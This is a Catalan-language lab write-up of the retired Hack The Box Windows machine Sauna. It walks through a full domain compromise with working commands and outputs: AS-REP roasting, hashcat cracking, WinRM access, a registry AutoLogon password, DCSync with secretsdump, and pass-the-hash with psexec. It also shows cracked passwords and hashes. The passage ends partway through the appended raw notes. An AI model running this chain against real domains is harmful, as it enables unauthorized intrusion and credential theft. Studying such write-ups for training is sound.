# Sauna — Writeup tècnic didàctic final (versió ampliada)

## 1. Introducció

**Sauna** és una màquina Windows retirada de Hack The Box, classificada com *Easy*, però amb un valor formatiu molt superior al que suggereix aquesta etiqueta. La resolució observada en aquest cas no depèn d'una única vulnerabilitat espectacular, sinó d'una **cadena de compromís d'Active Directory** construïda pas a pas a partir d'evidències reals: informació pública exposada a la web, derivació d'identitats, abús de Kerberos, reutilització de credencials trobades durant l'enumeració interna i, finalment, explotació de permisos delegats de domini fins a assolir el compromís total del controlador de domini.

El que fa especialment bona Sauna per estudiar és que obliga a practicar diverses idees importants alhora:

- com distingir entre **superfície visible** i **superfície dominant**;
- com convertir una web corporativa aparentment innòcua en **intel·ligència útil per a Active Directory**;
- com interpretar correctament un **AS-REP roastable user**;
- com llegir un compte que sembla modest localment, però que té **molt més pes en domini** del que aparenta.

Aquest document reconstrueix fidelment la resolució real observada en les notes del cas. No refà la màquina amb una via alternativa ni omple buits amb imaginació. Quan apareix una interpretació, es presenta com a interpretació; quan alguna cosa va quedar observada directament, es presenta com a fet verificat.

---

## 2. Guia de lectura

El document està organitzat com una narració tècnica cronològica. En cada fase es mantenen dos plans clarament diferenciats:

1. **el que es va observar realment**, és a dir, ordres executades, sortides obtingudes i decisions preses sobre evidència;
2. **la lectura didàctica**, que explica per què es va fer aquell pas, quina senyal prèvial justificava, quina part de la sortida importava de veritat i com canviava la decisió següent.

La idea no és construir un simple historial d'ordres, sinó un material reutilitzable per a estudi posterior.

---

## 3. Preparació de l'objectiu i arrencada del reconeixement

La màquina s'inicia amb el flux habitual de laboratori mitjançant l'eina `Inici-HTB`, que fixa l'objectiu, preparal directori base, valida la connectivitat i llança els primers escanejos.

### Ordre d'arrencada

```bash
Inici-HTB SAUNA 10.129.95.180
```

### Què buscava aquesta arrencada

No és tractava només de “veure ports” . L'arrencada inicial tenia diverses funcions concretes:

- confirmar que l'objectiu era viu;
- obtenir una primera estimació del sistema operatiu;
- obtenir una fotografia completa de la superfície TCP;
- identificar serveis i versions amb el menor nom possible de conjectures.

### Sortida rellevant

```text
PING 10.129.95.180 ... ttl=127
10.129.95.180 (ttl -> 127): Windows
```

```text
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

I en el escaneo de serveis:

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0.)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
Host: SAUNA
smb2-security-mode: Message signing enabled and required
clock-skew: 6h59m59s
```

### Interpretació tècnica

Aquí la dada important no és “Windows amb muchos puertos”, sinó **la combinació exacta** de serveis. DNS + Kerberos + LDAP + SMB + Global Catalog + WinRM + ADWS no dibuixen un Windows qualsevol: dibuixen amb molta força un **controlador de domini**.

Aquest matís és crucial perquè canvia tota l'estratègia. En lugar de obrir diverses branques a la vez —web, SMB, WinRM, LDAP— convé preguntar-se primer quina evidència pot ajudar a **construir identitats vàlides**, entendre l'autenticació del domini i trobar un punt d'entrada amb el menor soroll possible.

### Tancament de fase

La fase inicial dejó cuatro fets importants ja fijados:

- el objective era Windows;
- su huella encajaba amb un **DC**;
- la web corporativa i el domini parecían pertenecer al mateix context organizativo;
- el `clock skew` era gran i debía quedar anotado per fases posteriores amb Kerberos.

---

## 4. Identificació de la superfície dominant

A primera vista hi havia una web accesible en `80/tcp`, i podria haber sido tentador tratarla com una aplicación vulnerable clàssica. Sense embargo, la lectura correcta va ser distinta.

### Fet verificat

La web devolvíal título:

```text
Egotistical Bank :: Home
```

i el domini LDAP identificado era:

```text
EGOTISTICAL-BANK.LOCAL
```

### Per què aquesta relació importava

Perquè une la web pública amb el domini intern. Això no demuestra una vulnerabilitat web, però sí revela alguna cosa quizá més útil en aquesta fase: la web probablemente pertenece a la mateixa organización que Active Directory i, per tanto, pot exponer **noms reals**, cargos, estructura interna o pistas de nomenclatura.

### Lectura didàctica

En un entorn AD, una web corporativa pot tenir molt valor incluso sense presentar una sola vulnerabilitat tècnica visible. A veces el primer salto no sale de “romper” la aplicación, sinó de **leerla com font de intel·ligència**.

Per això la superfície dominant no se trató com “WEB-BASE” en sentido clàssic, sinó com:

**AD enum apoyada per intel·ligència pública des de la web.**

---

## 5. Extracció de noms des de `about.html`

Amb aquesta hipótesis, el següent pas va ser mínimo i de molt baix soroll: comprovar si la web exponía noms de persones reutilizables.

### Ordres utilitzades

```bash
curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
```

### Què s'esperava obtenir

No se buscava una vulnerabilitat. Se buscava alguna cosa molt més concret:

- noms completos plausibles;
- idealmente en una sección tipo *team*, *about us* o similar;
- suficientes per derivar usuaris del domini.

### Què va retornar la sortida

La expresión regular va retornar muchísimo soroll de plantilla HTML, CSS i textos decorativos, però entre toda aquesta sortida aparecieron clarament seis noms humans plausibles:

- `Fergus Smith`
- `Bowie Taylor`
- `Hugo Bear`
- `Shaun Coins`
- `Sophie Driver`
- `Steven Kerb`

### Interpretació

Aquest punt és important perquè convierte una intuición en un Fet verificat: la web pública **sí exponía identitats** útils per Active Directory.

La decisió correcta a partir de ahí no era saltar a LDAP o SMB, sinó consolidar esos noms en un artefacto net de trabajo.

### Lliçó reutilitzable

Una web pública en un laboratorio AD pot no ser la puerta de entrada tècnica, però sí una **base de datos de noms humans**. I això, en ciertos escenarios, vale més que una vulnerabilitat sorollosa mal interpretada.

---

## 6. Consolidació d'identitats observades

Per evitar que el soroll de `grep` contaminara la següent fase, els noms reals se pasaron a un fitxer net.

### Ordre utilitzada

```bash
printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt
```

Verificació:

```bash
cat fullnames.txt
```

### Resultat observat

```text
Fergus Smith
Bowie Taylor
Hugo Bear
Shaun Coins
Sophie Driver
Steven Kerb
```

i la ubicación va quedar correctament fijada en:

```text
/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt
```

### Per què aquest pas té valor real

Perquè separa **senyal** de **soroll** i convierte una observació en un artefacto operatiu reutilitzable. Aquesta distinción importa molt en writeups didácticos: una cosa és “se vieron noms en una web”, i otra millor és “va quedar una llista neta, trazable i llista per derivació de comptes”.

---

## 7. De noms reals a candidats d'usuari

Una vez obtinguts els noms, el següent pas no va ser probar accés a ciegas, sinó construir una llista raonable de comptes posibles.

### Primera derivació ampla

Se va generar una primera llista `usernames.txt` amb múltiples patrones habituales:

- `nombre`
- `apellido`
- `nombre.apellido`
- `nombreapellido`
- `nombre_apellido`
- `inicialapellido`
- i algunas variantes menys sólidas

### Bloc utilitzat

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        first,
        last,
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
        f"{first}{last[0]}",
        f"{first[0]}.{last}",
        f"{last}.{first}",
        f"{last}{first[0]}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos en {dst}")
PY
```

### Sortida útil

```text
[+] Guardados 60 candidatos en usernames.txt
fergus
smith
fergus.smith
fergussmith
fergus_smith
fsmith
...
```

### Què es va aprendre d'aquesta sortida

La generación funcionó, però mezcló candidats fortes amb variantes bastante flojas. Aquest és un punt metodològic important: una llista més llarga no siempre és una llista millor.

### Segona derivació: llista prioritzada

Per això se va generar després `usernames_priority.txt`, conservando només cuatro patrones de mes valor inicial:

- `nombre.apellido`
- `nombreapellido`
- `nombre_apellido`
- `inicialapellido`

### Bloc utilitzat

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames_priority.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos prioritarios en {dst}")
PY
```

### Sortida rellevant

```text
fergus.smith
fergussmith
fergus_smith
fsmith
bowie.taylor
bowietaylor
bowie_taylor
btaylor
...
```

### Interpretació tècnica

Aquesta fase cierra molt bien una idea important: en Active Directory no siempre gana quien genera mes variantes, sinó quien genera variantes **millor priorizadas** i sabe justificar per què empieza per unas i no per otras.

---

## 8. Abans de Kerberos: correcció del desfasament horari

La enumeració inicial ja hi havia deixat una alerta molt seria:

```text
clock-skew: 6h59m59s
```

Abans de usar Kerberos, això debía corregirse.

### Ordres utilitzades

```bash
date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
```

### Sortida rellevant

```text
2026-04-23 20:44:15.93361 (+0200) +25202.319033 +/- 0.024418 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25202.317982
```

### Què significava aquesta sortida

La diferencia era de unas **siete horas**. No era un detalle cosmético. Era un problema suficientment gran com per contaminar per completo cualquier lectura posterior de Kerberos.

### Per què aquest pas era obligatori

Kerberos depèn del temps. Si el rellotge està roto, una tècnica pot parecer fallida per un motivo completamente distinto del que se està interpretando.

### Lliçó reutilitzable

Una bona llista de usuaris pot quedar inutilizada per un rellotge desalineado. Abans de declarar muerta una via Kerberos, convé asegurarse de que el temps no està saboteando la lectura.

---

## 9. Validació d'identitats mitjançant ASREPRoasting

Amb la hora corregida i la llista prioritzada preparada, el següent pas va ser comprovar si alguno de els candidats devolvía una answer útil en Kerberos sense contrasenya.

### Ordre utilitzada

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -no-pass -dc-ip 10.129.95.180
```

### Què buscava aquesta ordre

No autenticaba usuaris amb contrasenyas. El que que hacía era preguntar al KDC si alguna compte tenia **preautenticació Kerberos deshabilitada**, permitiendo así obtenir un AS-REP roastable.

### Sortida observada

La mayoría de candidats devolvieron:

```text
KDC_ERR_C_PRINCIPAL_UNKNOWN
```

Però uno va retornar alguna cosa completamente distinto:

```text
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
```

### Què va quedar demostrat aquí

Aquest punt valida de golpe diverses decisions anteriores:

1. la web sí aportó noms útils;
2. la derivació de usuaris no va ser arbitraria;
3. la convenció `inicial + apellido` funcionó;
4. la compte `fsmith` era real;
5. a més, era **AS-REP roastable**.

### Implicació per a la fase següent

Des de aquí ja no tenia sentido seguir ampliando llistes de usuaris o probar SMB/LDAP per inercia. La evidència dominant era molt millor: un hash Kerberos explotable offline.

---

## 10. Preservació del hash i treball offline

Abans de cualquier cracking, el hash se guardó en un fitxer net.

### Bloc utilitzat

```bash
cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
```

### Verificació

`wc -l` va retornar `1`, el que que va confirmar que el artefacto útil estaba aislado en una sola línea i sense soroll.

### Per què és important documentar-ho

Perquè en un cas así el hash ja no és només una sortida de eina: passa a ser un **artefacto central de la investigación**.

---

## 11. Recuperació offline de la contrasenya de `fsmith`

### Ordre utilitzada

```bash
hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
```

### Què fa exactament `-m 18200`

Aquest modo corresponde a:

- `Kerberos 5, etype 23, AS-REP`

És dir, el formato exacto del material obtenido amb `GetNPUsers.py`.

### Resultat observat

Hashcat resolvió la contrasenya amb `rockyou.txt`:

```text
...:Thestrokes23
```

### Credencial recuperada

- usuari: `fsmith`
- contrasenya: `Thestrokes23`

### Què canvia a partir d'aquí

Fins a aquest punt la ruta hi havia sido:

- noms → usuaris plausibles → compte real → hash AS-REP

Ara la cadena da un salto cualitativo: ja existeix una **credencial completa** i reutilitzable.

El següent pas correcte ja no és “seguir abusando de Kerberos”, sinó comprovar en què superfície exposada aquesta credencial té valor operatiu real.

---

## 12. Accés inicial per WinRM com `fsmith`

WinRM ja estaba exposat des de la fase de enumeració inicial, así que era la opción més neta per validar el valor práctico de la credencial.

### Ordre utilitzada

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

### Què s'esperava obtenir

- o una shell remota válida;
- o un fallo de autorización que obligara a reinterpretar el alcance de la compte.

### Resultat observat

```text
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

### Fet verificat

La credencial no només era válida en abstracto, sinó **operativa** en un servei real del sistema.

### Lectura didàctica

Aquest és el primer gran pivote del cas. El problema deixa de ser “encontrar una debilidad de autenticación” i passa a ser “enumerar correctament un foothold ja conseguido”.

---

## 13. Enumeració interna inicial després del foothold

Una vez dentro com `fsmith`, la decisió correcta no va ser saltar a eines pesadas, sinó fijar context.

### Ordres utilitzades

```powershell
whoami
whoami /groups
hostname
ipconfig /all
systeminfo
echo $env:USERDOMAIN
echo $env:COMPUTERNAME
dir C:\Users
type C:\Users\FSmith\Desktop\user.txt
```

### Sortida clau resumida

```text
whoami
egotisticalbank\fsmith
```

```text
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
```

```text
hostname
SAUNA
```

```text
echo $env:USERDOMAIN
EGOTISTICALBANK
```

```text
dir C:\Users
Administrator
FSmith
Public
svc_loanmgr
```

```text
type C:\Users\FSmith\Desktop\user.txt
c06623afb7a5c08a412d732234887383
```

### Què importava realment d'aquesta sortida

- `fsmith` tenia accés remot, però no parecía administrador;
- el flag de usuari ja era legible;
- i, sobre todo, existía un perfil local de **`svc_loanmgr`**.

### Per què aquest perfil va canviar la direcció del cas

Perquè sugería la presencia de otra compte amb mes valor potencial que `fsmith`. I en Windows, quan una compte de servei deixa rastro local, merece la pena preguntarse si el sistema expone credencials o configuración asociadas a ella.

---

## 14. AutoLogon al registre: la segunda credencial

### Ordre utilitzada

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Què s'estava buscant

Els parámetros típicos de AutoLogon:

- `DefaultDomainName`
- `DefaultUserName`
- `DefaultPassword`

### Sortida rellevant

```text
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

### Què va quedar demostrat

El sistema almacenaba una contrasenya en clar en el registre. Això ja no era una inferència ni una conjetura: era un secreto reutilitzable observat directament en el host.

### La discrepància important

Aquí va aparèixer un matiz molt fino, però decisivo:

- en `C:\Users` se hi havia visto `svc_loanmgr`;
- en `Winlogon` aparecía `svc_loanmanager`.

Abans de reutilizar la credencial, tocaba resolver cuál eral nom real de la compte.

### Lliçó reutilitzable

Quan un sistema expone una contrasenya en clar, la tentación natural és probarla inmediatamente. El problema és que si el identificador del usuari està mal interpretado, una credencial perfectamente bona pot parecer inútil.

---

## 15. Resolució de la discrepància d'usuari

### Ordres utilitzades

```powershell
net user svc_loanmgr
net user svc_loanmanager
```

### Resultat observat

`svc_loanmgr` sí existía i devolvía informació de compte. `svc_loanmanager` no existía.

A més, `svc_loanmgr` pertenecía a:

- `Domain Users`
- `Remote Management Users`

### Interpretació

La discrepancia va quedar resuelta. La contrasenya observada en AutoLogon seguía siendo válida com secreto exposat, però el nom de usuari operatiu correcte era:

- `svc_loanmgr`

### Implicación

Això permitía intentar un nuevo accés remot amb molt bona base:

- nom real verificat;
- contrasenya observada en clar;
- pertenencia a `Remote Management Users`.

---

## 16. Canvi de context a `svc_loanmgr`

### Ordre utilitzada

```bash
evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

### Resultat observat

```text
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

### Què significó aquest pas

Fins a aquest momento, `fsmith` hi havia sido la puerta de entrada. A partir de aquí, la compte principal de trabajo va passar a ser `svc_loanmgr`.

I aquí apareix una idea molt important en AD: una compte pot parecer modesta des de fuera, però tenir un pes enorme en el domini.

---

## 17. Mesura del valor real de `svc_loanmgr`

El següent pas va ser confirmar què grups i privilegis tenia realment aquesta nueva compte.

### Primer entrebanc operatiu

Se va executar per error:

```powershell
whoami / groups
whoami / priv
```

i això va retornar un error sintáctico:

```text
ERROR: Invalid argument/option - '/'
```

### Correcció

La forma correcta era:

```powershell
whoami
whoami /groups
whoami /priv
```

### Sortida observada

Grups:

```text
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
...
```

Privilegis:

```text
SeMachineAccountPrivilege     Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

### Què va ensenyar aquesta sortida

I aquest és uno de els grandes punts didácticos de Sauna:

- `svc_loanmgr` **no** destacaba per privilegis locals potentes;
- no aparecían grups administrativos locals;
- no saltaban privilegis clásicos com `SeImpersonatePrivilege`.

Això obligaba a cambiar la pregunta. El valor de aquesta compte no parecía estar en el host local, sinó probablemente en el **domini**.

### Lliçó reutilitzable

Quan una compte no destaca ni per grups locals ni per privilegis del token, no convé descartarla massa rápido. En Active Directory, muchas comptes aparentment discretas esconden su valor en **ACLs, delegaciones i drets sobre objectes del domini**.

---

## 18. Recol·lecció d'Active Directory amb `bloodhound-python`

Amb aquesta lectura, la següent decisió va ser correcta: recoger informació de AD des de fuera per entendre què podía fer `svc_loanmgr` en el domini.

### Ordres utilitzades

```bash
cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
zip bloodhound_sauna.zip *.json
ls -l *.json bloodhound_sauna.zip
```

### Sortida rellevant

```text
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
```

### Què es va aprendre aquí

La recol·lecció va ser válida i produjo diversos JSON i un ZIP listo per importar. El detalle del fallo inicial del TGT no va ser el dato central, perquè la eina va fer *fallback* a NTLM i completó la recogida.

### El problema real va venir després

La part local de anàlisi visual va quedar bloqueada per diversos tropiezos del entorn atacant:

- arranque de Neo4j com part del setup;
- primera ejecución de BloodHound amb componentes CE;
- mezcla entre recol·lecció `LEGACY` i stack `CE`;
- problemas de navegador al lanzarlo com root;
- `bhapi.json` roto per un carácter sobrante;
- i, finalment, un fallo de migración SQL.

### Per què val la pena documentar-ho

Perquè enseña una lección metodològica important: una eina local pot atascarse **sense que la explotació esté mal encaminada**. El problema pot estar en el visor, no en la cadena de atac.

---

## 19. Decisió metodològica correcta ante el atasco de BloodHound

La investigación no se detuvo a pelear indefinidamente amb el visor local. I aquesta va ser una decisió molt bona.

### Raonament

A esas alturas ja hi havia suficient evidència per sostener una hipótesis forta:

- `svc_loanmgr` no destacaba localment;
- per tanto, el que més raonable era que su valor estuviera en domini;
- si això era cierto, debía poder comprobarse directament.

### La pregunta adequada va passar a ser

**¿Té `svc_loanmgr` permisos de replicación sobre el domini?**

---

## 20. Verificació directa de DCSync

### Ordre utilitzada

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
```

### Què buscava aquesta ordre

No se trataba de un volcado masivo. La opción `-just-dc-user Administrator` restringía la prueba a una comprobación molt concreta: verificar si la compte tenia drets suficientes per extraer el material del administrador del domini.

### Resultat observat

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
```

### Què va quedar demostrat

Esto cerró la duda més important del cas:

- `svc_loanmgr` tenia capacidad efectiva de **DCSync**.

Aquest és el momento en el que la compte deixa de ser “interesante” i passa a ser **crítica**.

### Implicación

Ja no hacía falta seguir enumerando ACLs o arreglar BloodHound per saber si la compte tenia valor. La demostración práctica ja estaba hecha.

---

## 21. Pass-the-Hash contra `Administrator`

Amb el hash NTLM del `Administrator` en la mano, el següent pas va ser directo i coherente.

### Ordre utilitzada

```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

### Què s'esperava obtenir

Una autenticación Pass-the-Hash exitosa i una shell remota amb privilegis máximos en el DC.

### Resultat observat

```text
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Creating service ...
[*] Starting service ...
Microsoft Windows [Version 10.0.17763.973]
C:\Windows\system32>
```

### Interpretació

El hash del `Administrator` era plenamente reutilitzable. En aquest punt, el cas ja estaba prácticamente tancat. Només faltaba fer la Verificació mínima de identitat i lectura del flag final.

---

## 22. Verificació final de control total

### Ordres utilitzades

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

### Sortida observada

```text
nt authority\system
SAUNA
2ebc5339eff500834123056f79cad936
```

### Fets verificats

- el context final era `SYSTEM`;
- el host era `SAUNA`;
- el `root.txt` era accesible.

Amb això va quedar confirmado el compromís total del controlador de domini.

---

## 23. Cadena tècnica completa resumida

La resolució real observada en Sauna va ser aquesta:

1. Enumeració inicial amb huella clara de DC Windows.
2. Interpretació de la web com font de intel·ligència i no com via principal de explotació.
3. Extracció de noms reals des de `about.html`.
4. Creació de `fullnames.txt`.
5. Derivació de usuaris candidats i priorización de convencions plausibles.
6. Correcció del `clock skew` abans de tocar Kerberos.
7. ASREPRoasting exitoso sobre `fsmith`.
8. Preservación del hash i recuperació offline de `Thestrokes23`.
9. accés remot per WinRM com `fsmith`.
10. Enumeració interna i detección del perfil `svc_loanmgr`.
11. Consulta del registre i hallazgo de AutoLogon amb contrasenya en clar.
12. Resolució de la discrepancia `svc_loanmanager` / `svc_loanmgr`.
13. accés remot per WinRM com `svc_loanmgr`.
14. Comprobación de que el valor real de la compte no estaba en el host, sinó en el domini.
15. Recol·lecció de AD amb `bloodhound-python`.
16. Atasco local del visor BloodHound i reevaluación metodològica correcta.
17. Validación directa de DCSync amb `secretsdump`.
18. Extracción del hash NTLM de `Administrator`.
19. Pass-the-Hash amb `psexec.py`.
20. Shell final com `SYSTEM` i lectura del `root.txt`.

---

## 24. Lliçons reutilitzables

### La web pública pot ser una font de identitat, no una superfície dominant de explotació

No toda web té que romperse. Algunas simplemente **alimentan millor que ninguna otra fase** la construcción de identitats válidas en AD.

### La nomenclatura de usuaris se ha de trabajar com un artefacto, no com improvisación

Passar de noms reals a `fullnames.txt`, després a `usernames.txt` i finalment a `usernames_priority.txt` no va ser burocracia: va ser una manera ordenada de elevar la calidad de la següent validación.

### Kerberos sense temps correcte engaña

El `clock skew` de siete horas habría fet molt fácil interpretar mal la fase de Kerberos. Corregir el temps va ser una precondición, no una comodidad.

### Un usuari AS-REP roastable cambia de verdad el cas

Quan una compte retorna un AS-REP hash, la prioridad deixa de ser ampliar llistes de noms i passa a ser preservar aquest artefacto i trabajarlo offline.

### Un foothold inicial no siempre és el usuari important del cas

`fsmith` va ser suficient per entrar, però no per tancar la màquina. Su verdadero valor estuvo en permitir descubrir alguna cosa millor.

### El registre de Windows sigue siendo una font de secretos brutal

`Winlogon` entregó una contrasenya en clar. Aquesta mala práctica convirtió una enumeració post-foothold aparentment simple en un pivote decisivo.

### El pes real de una compte pot estar en el domini, no en sus grups locals

Aquest és quizá el aprendizaje més forta de Sauna. `svc_loanmgr` no impresionaba localment. Però su impacto real estaba en Active Directory.

### Quan el visor falla, la cadena no té per què estar rota

El atasco amb BloodHound enseñó molt bien a distingir entre:
- un problema del objective;
- i un problema del entorn atacant.

I aquesta distinción ahorra muchísimo temps.

---

## 25. Nota editorial sobre aquesta versió final

Aquesta versión amplía de forma claral desarrollo del cas respecto a la versión anterior. El objective ha sido conservar **la riqueza didàctica de les notes**, però quitando la sensación mecánica que producía repetir en cada microfase les mismas etiquetas de “objective”, “Fets verificats”, “assumptions”, “method”, “answer”, “commands”, “checks” i “notes”.

Aquesta informació no se ha eliminat. Se ha **reintegrado** dentro de una narrativa tècnica més natural i més legible, manteniendo la trazabilidad del cas real.

### Correccions aplicades sobre les notes originals

No se han fet correcciones destructivas sobre el contenido tècnic original. Només se han asumido tres tipos de normalización editorial:

1. **orden i maquetación** del cuerpo principal;
2. **integración narrativa** de contenido repetitivo;
3. **lectura explícita de pequeños errores operativos** ja presentes en les pròpies notes, per ejemplo:
   - la sintaxis incorrecta `whoami / groups` i `whoami / priv`;
   - la discrepancia entre `svc_loanmanager` i `svc_loanmgr`;
   - el atasco local amb BloodHound CE frente a recol·lecció Legacy.

No se ha inventat una ruta nueva ni se ha reescrito la màquina com si se hubiera resuelto de otro modo.

---

## 26. Annex de traçabilitat — notes originals completes

> És conserven a continuació les notes originals completes com a bloc de traçabilitat. No s'han eliminat passos, pivotes ni sortides rellevants. El cos principal d'aquest document és la versió didàctica consolidada; el que segueix preserval historial operatiu original.

---

### Iniciem l'explotació de la màquina Sauna de Hack The Box.

### Síntesi de la màquina:

Sauna és una màquina Windows de dificultad Easy i a més està retirada en HTB. HTB la describe com una màquina centrada en enumeració i explotació de Active Directory, publicada originalmente el 15/02/2020.

Síntesi tècnica – Sauna

Sauna és una màquina orientada a una cadena clàssica de compromís en entorn Windows/Active Directory. La resolució part de una fase de enumeració sobre informació exposada per la organización, continúa amb la construcción de identitats válidas dentro del domini i evoluciona hacia técnicas de abús de autenticación Kerberos per obtenir credencials reutilizables. A partir de aquest accés inicial, la màquina obliga a profundizar en la enumeració interna del sistema i de els privilegis delegats en el domini, fins a enlazar una ruta de escalada que culmina en compromís total del controlador de domini. En términos formativos, és una màquina molt útil per practicar metodología AD, correlación de evidències, uso de eines de reconocimiento de domini i comprensión de cadenas de atac basadas en permisos mal asignados.

Valor tècnic real

Molt bona per aprender flujo básico de AD enum → Kerberos abuse → accés remot → anàlisi de privilegis → DCSync.
Tot i que HTB la marca com Easy, és una easy de molt valor pedagógico si quieres empezar a entendre Windows/AD de forma seria.

### Iniciamos amb nuestro programa Inici_HTB, que nos ayuda a organizar la informació de cada màquina i a ejecutar els primeros passos de reconocimiento.

❯ Inici-HTB SAUNA 10.129.95.180
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.95.180 (10.129.95.180) 56(84) bytes of data.
64 bytes from 10.129.95.180: icmp_seq=1 ttl=127 time=50.0 ms

--- 10.129.95.180 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.026/50.026/50.026/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.95.180 (ttl -> 127): Windows

[*] Lanzando escaneo completo de puertos
[sudo] contrasenya per r4mon:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-23 12:55 CEST
Initiating SYN Stealth Scan at 12:55
Scanning 10.129.95.180 [65535 ports]
Discovered open port 80/tcp on 10.129.95.180
Discovered open port 135/tcp on 10.129.95.180
Discovered open port 139/tcp on 10.129.95.180
Discovered open port 445/tcp on 10.129.95.180
Discovered open port 53/tcp on 10.129.95.180
Discovered open port 88/tcp on 10.129.95.180
Discovered open port 49676/tcp on 10.129.95.180
Discovered open port 49674/tcp on 10.129.95.180
Discovered open port 5985/tcp on 10.129.95.180
Discovered open port 49688/tcp on 10.129.95.180
Discovered open port 593/tcp on 10.129.95.180
Discovered open port 49696/tcp on 10.129.95.180
Discovered open port 3269/tcp on 10.129.95.180
Discovered open port 9389/tcp on 10.129.95.180
Discovered open port 389/tcp on 10.129.95.180
Discovered open port 49668/tcp on 10.129.95.180
Discovered open port 3268/tcp on 10.129.95.180
Discovered open port 636/tcp on 10.129.95.180
